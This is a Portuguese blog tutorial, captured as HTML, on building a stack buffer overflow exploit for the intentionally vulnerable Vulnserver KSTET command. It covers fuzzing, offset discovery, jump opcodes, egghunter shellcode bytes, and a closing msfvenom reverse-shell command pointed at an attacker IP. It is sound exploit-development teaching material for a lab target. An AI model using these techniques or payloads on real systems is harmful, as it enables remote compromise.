href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" /><meta property="og:url" content="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" /><meta property="og:site_name" content="Helvio Junior" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-02-17T07:59:48-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter" /><meta name="twitter:site" content="@helvioju" /><meta name="twitter:creator" content="@Helvio Junior (m4v3r1ck)" /><meta name="google-site-verification" content="JR4IIP9jfvOwxn2ybV_Qn0SrtDPlTrKomdPWgBuP55k"" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Helvio Junior (m4v3r1ck)"},"dateModified":"2023-08-17T00:19:29-03:00","datePublished":"2019-02-17T07:59:48-03:00","description":"Ola pessoal, Neste post vamos dar inicio a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim neste post abordaremos a utilização da técnica de egghunter, que basicamente consiste em encontrar e executar nosso shellcode (egg) em outra área de memória. O Exploit 0x01 - Fuzzing Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver. Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP. [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. [/sourcecode] Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT [/sourcecode] Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados. Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0 Total Number of Strings is 681 Fuzzing Fuzzing Variable 0:0 line read=Welcome to Vulnerable Server! Enter HELP for help. Fuzzing Variable 0:1 Variablesize= 5004 Fuzzing Variable 0:2 Variablesize= 5005 Fuzzing Variable 0:3 Variablesize= 21 ^C [/sourcecode] Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug. [sourcecode language=&quot;shell&quot;]Fuzzing Variable 0:1 Variablesize= 5004 [/sourcecode] Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger: Pode-se observar que o spike enviou a requisição conforme abaixo: [sourcecode language=&quot;shell&quot;]KSTET /.:/AAAAAAAAA........ [/sourcecode] Provavelmente 5000 A com o prefixo /.:/ Vamos duplicar este exploit em python criando então uma prova de conceito (PoC) &nbsp; 0x02 - Exploit de PoC Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres /.:/ então vamos reproduzir isso: Executando nosso PoC temos a seguinte saída: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# ./02-poc.py [*] Enviando requisicao maliciosa ... [/sourcecode] E o crash ocorreu: Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre. 0x03 - Determinando o tipo de Exploit e o Offset de controle Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por: [sourcecode language=&quot;shell&quot;]41414141 [/sourcecode] Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como vanilla EIP overwrite. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da metasploit para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu. Gerando o buffer único: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_create -l 5000 [/sourcecode] Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo: Execute este script e veja como ficou o registrador EIP: Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_offset -l 5000 -q 41326341 [*] Exact match at offset 66 [/sourcecode] Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto. 0x04 - Verificando o Offset Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo: E executamos ele obtendo o resultado abaixo: Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs. Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes: Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos. Nota importante: Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros. 0x05 - Saltando para nosso Buffer O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte. [sourcecode language=&quot;shell&quot;]!mona jmp -n -r ESP [/sourcecode] Este comando nos retornou 9 opções Porém a nossa escolha foi a primeira: [sourcecode language=&quot;shell&quot;]Log data, item 11 Address=625011AF Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) [/sourcecode] Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - &#39;\\r&#39;, 0x0a - &#39;\\n&#39;). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional. Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian. Segue nosso exploit atualizado: Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão Goto address in Dissassembler demonstrado abaixo: E digite o endereço da instrução JMP ESP escolhida: Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint. Agora execute o exploit e veja a aplicação parando no breakpoint selecionado Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status &quot;Breakpoint at essfunc.625011AF&quot; e não outro erro como access violation. Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs 0x06 - Saltando para o buffer maior Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes) Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos. Olhando na imagem anterior vemos o seguinte cenário: [sourcecode language=&quot;shell&quot;]00EDF9F8 43 INC EBX [/sourcecode] Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As? [sourcecode language=&quot;shell&quot;]00EDF9B2 41 INC ECX [/sourcecode] Então podemos fazer alguns cálculos para realizar a movimentação necessária [sourcecode language=&quot;shell&quot;]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70 [/sourcecode] Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX: [sourcecode language=&quot;shell&quot;]PUSH ESP POP EDX [/sourcecode] E posteriormente subtrair 0x46 (decimal 70) de seu valor: [sourcecode language=&quot;shell&quot;]SUB EDX,0x46 [/sourcecode] E por fim saltar para o endereço desejado: [sourcecode language=&quot;shell&quot;]JMP EDX [/sourcecode] Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada msf-nasm_shell conforme demonstrado abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;gt; PUSH ESP 00000000 54 push esp nasm &amp;gt; SUB EDX,0x46 00000000 83EA46 sub edx,byte +0x46 nasm &amp;gt; JMP EDX 00000000 FFE2 jmp edx nasm &amp;gt; [/sourcecode] Segue abaixo o exploit atualizado: Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP) [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;gt; JMP short -72 00000000 EBB6 jmp short 0xffffffb8 nasm &amp;gt; [/sourcecode] Segue abaixo a segunda opção: Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção. Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo: Neste ponto temos pelo menos 2 formar de continuar com o exploit: Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Este processo está descrito no post Criação de Exploits – Parte 4 – Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv Neste post abordaremos a opção 1: utilização de egghunter. 0x07 - PoC2 Localizando o Shellcode Antes de dar continuidade ao processo de exploit primeiramente precisamos entender se será possível enviar o nosso shellcode através de outro comando para o servidor. Após diversos testes encontrei a função GDOG do servidor que permite o envio de pelo menos 1000 bytes, mais que suficiente para a colocação do nosso shellcode. Para facilitar nosso teste no lugar doa 66 As vou colocar 66 0xCC (breakpoint), para que a aplicação pare a execução nele e possamos analisar a memória. Adicionalmente foi colocado no script um envio do nosso pseudo shellcode antes no buffer que irá causar o overflow, conforme exemplificado abaixo: [sourcecode language=&quot;shell&quot;]shellcode = b&quot;GDOG &quot; shellcode += &quot;T00WT00W&quot; shellcode += &quot;C&quot; * 1000 print &quot;[*] Enviando shellcode...&quot; exp.recv(4096) exp.send(shellcode) print &quot;[*] Enviando exploit...&quot; exp.recv(4096) exp.send(buffer) [/sourcecode] Execute o exploit: Note que como esperado a aplicação parou no breakpoint 0xCC: Com a ajuda do script mona podemos verificar se foi encontrado na memória [sourcecode language=&quot;shell&quot;]!mona find -s T00WT00W [/sourcecode] &nbsp; Bom! Se o mona foi capaz de achar um egghunter escrito por nós também será. 0x08 - Egghunter Egghunter é uma técnica utilizada onde temos um código relativamente pequeno +- 45 bytes que tem sua principal função buscar na memória um &#39;egg&#39; que é na verdade nosso shellcode. É muito comum neste tipo de estudo você ver o termo T00W ou W00T, ele é uma regra? Não, ele é o que geralmente usamos para fins acadêmicos, mas pode ser qualquer sequencia de 4 bytes que será utilizada para identificar o inicio do nosso shellcode. O Egghunter proposto neste post executa se forma simplificada o seguinte fluxo: Define o endereço de memória inicial da busca e salta para o passo 4; Incrementa 4Kb ao endereço de memória atual e segue para o passo 4; Incrementa 1 byte ao endereço de memória atual; Verifica se tem acesso ao endereço de memória; Se sim salta para o passo 5; caso não salta para o passo 2; Verifica se no endereço atual existe 1 instância do nosso EGG (W00T); Se existe continua a execução para o passo 6; caso contrário salta para o passo 3; Verifica se nos próximos 4 bytes existe mais 1 instância do nosso EGG (W00T); Se sim faz um JMP para o byte seguinte do WOOTWOOT; caso não salta para o passo 3; Então vamos o nosso egghunter Para compilar ele e pegar o seu opcode para colocar em nosso python execute os comandos abaixo: [sourcecode language=&quot;shell&quot;]nasm egghunter1.asm -o egghunter -l egghunter.lst cat egghunter | msfvenom -p - -a x86 --platform win -e generic/none -f python [/sourcecode] Tendo o seguinte resultado [sourcecode language=&quot;shell&quot;]Attempting to read payload from STDIN... Found 1 compatible encoders Attempting to encode payload with 1 iterations of generic/none generic/none succeeded with size 36 (iteration=0) generic/none chosen with final size 36 Payload size: 36 bytes Final size of python file: 184 bytes buf = &quot;&quot; buf += &quot;\\x89\\xca\\xeb\\x06\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02&quot; buf += &quot;\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8\\x54\\x30\\x30\\x57&quot; buf += &quot;\\x89\\xd7\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7&quot; [/sourcecode] Basta agora copiar este código para nosso exploit. Para facilitar nosso estudo fiz uma alteração no exploit adicionando um breakpoint antes da chamada JMP EDI ficando como abaixo: Ao executar o nosso exploit ele irá parar na chamada no JMP EDI para que possamos verificar como estão nossos registradores, conforme imagem abaixo: Pode-se observar que o EDI aponta para o endereço de memória [sourcecode language=&quot;shell&quot;]0x0027437D [/sourcecode] Que per sua vez é o endereço exatamente posterior ao endereço do W00TW00T, você deve ter percebido que na memória o W00TW00T aparece como T00WT00W, isso ocorre em virtude do endianess. 0x09 - Aproveite o shell Agora basta alterar os Cs para o shellcode gerado pelo msfvenom e aproveitar. Gere o shellcode com o comando abaixo, nele coloquei como badchars os clássicos nullbyte, \\r e \\n. [sourcecode language=&quot;shell&quot;]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -e x86/alpha_mixed -b &quot;\\x00\\x0a\\x0d&quot; -f python [/sourcecode] Copie o conteúdo do buffer no exploit conforme arquivo abaixo e senha feliz! &nbsp;","headline":"Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/"},"url":"https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/"}</script><title>Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter | Helvio Junior</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Helvio Junior"><meta name="application-name" content="Helvio Junior"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/m4v3r1ck.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Helvio Junior</a></div><div class="site-subtitle font-italic">Cyber security researcher, speaker, low level and binary exploitation entusiast. <br /><br />"I’m just a child who has never grown up. I still keep asking these 'how' & 'why' questions. Occasionally, I find an answer. Stephen Hawking"</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://www.linkedin.com/in/helviojunior" aria-label="linkedin" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.youtube.com/@Sec4US" aria-label="youtube" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="https://github.com/helviojunior" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['helvio.junior','sec4us.com.br'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/it"> It </a> </span> <span> <a href="/security"> Security </a> </span> <span> <a href="/criacao-de-exploits"> Criacao-de-exploits </a> </span> <span>Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Helvio Junior (m4v3r1ck) </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Feb 17, 2019, 7:59 AM -0300" prep="on" > Feb 17, 2019 <i class="unloaded">2019-02-17T07:59:48-03:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Aug 17, 2023, 12:19 AM -0300" prefix="Updated " > Aug 17, 2023 <i class="unloaded">2023-08-17T00:19:29-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2440 words">13 min</span></div></div><div class="post-content"><p>Ola pessoal,</p><p>Neste post vamos dar inicio a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim neste post abordaremos a utilização da técnica de egghunter, que basicamente consiste em encontrar e executar nosso shellcode (egg) em outra área de memória.</p><p></p><h2>O Exploit</h2><h3>0x01 - Fuzzing</h3><p>Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver.</p><p>Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP.</p><p>[sourcecode language="shell"]# nc 172.30.200.66 9999<br /> Welcome to Vulnerable Server! Enter HELP for help.<br /> [/sourcecode]</p><p>Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis</p><p>[sourcecode language="shell"]# nc 172.30.200.66 9999<br /> Welcome to Vulnerable Server! Enter HELP for help.<br /> HELP<br /> Valid Commands:<br /> HELP<br /> STATS [stat_value]<br /> RTIME [rtime_value]<br /> LTIME [ltime_value]<br /> SRUN [srun_value]<br /> TRUN [trun_value]<br /> GMON [gmon_value]<br /> GDOG [gdog_value]<br /> KSTET [kstet_value]<br /> GTER [gter_value]<br /> HTER [hter_value]<br /> LTER [lter_value]<br /> KSTAN [lstan_value]<br /> EXIT<br /> [/sourcecode]</p><p>Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão</p><p><a href="/assets/2019/02/00-2019-02-16_124240.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 682 348'%3E%3C/svg%3E" data-src="/assets/2019/02/00-2019-02-16_124240.png" alt="" width="682" height="348" class="lazyload" data-proofer-ignore></a></p><p>Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados.</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/01-fuzz.spk"></script></p><p>Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0<br /> Total Number of Strings is 681<br /> Fuzzing<br /> Fuzzing Variable 0:0<br /> line read=Welcome to Vulnerable Server! Enter HELP for help.<br /> Fuzzing Variable 0:1<br /> Variablesize= 5004<br /> Fuzzing Variable 0:2<br /> Variablesize= 5005<br /> Fuzzing Variable 0:3<br /> Variablesize= 21<br /> ^C<br /> [/sourcecode]</p><p>Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug.</p><p>[sourcecode language="shell"]Fuzzing Variable 0:1<br /> Variablesize= 5004<br /> [/sourcecode]</p><p>Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger:</p><p><a href="/assets/2019/02/01-2019-02-16_124535.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 956'%3E%3C/svg%3E" data-src="/assets/2019/02/01-2019-02-16_124535.png" alt="" width="1120" height="956" class="lazyload" data-proofer-ignore></a></p><p>Pode-se observar que o spike enviou a requisição conforme abaixo:</p><p>[sourcecode language="shell"]KSTET /.:/AAAAAAAAA........<br /> [/sourcecode]</p><p>Provavelmente 5000 A com o prefixo /.:/</p><p>Vamos duplicar este exploit em python criando então uma prova de conceito (PoC)</p><p>&nbsp;</p><h3>0x02 - Exploit de PoC</h3><p>Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres <strong>/.:/ </strong>então vamos reproduzir isso:<strong><br /> </strong></p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/02-poc.py"></script></p><p>Executando nosso PoC temos a seguinte saída:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# ./02-poc.py<br /> [*] Enviando requisicao maliciosa ...<br /> [/sourcecode]</p><p>E o crash ocorreu:<br /> <a href="/assets/2019/02/01-2019-02-16_124535.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 956'%3E%3C/svg%3E" data-src="/assets/2019/02/01-2019-02-16_124535.png" 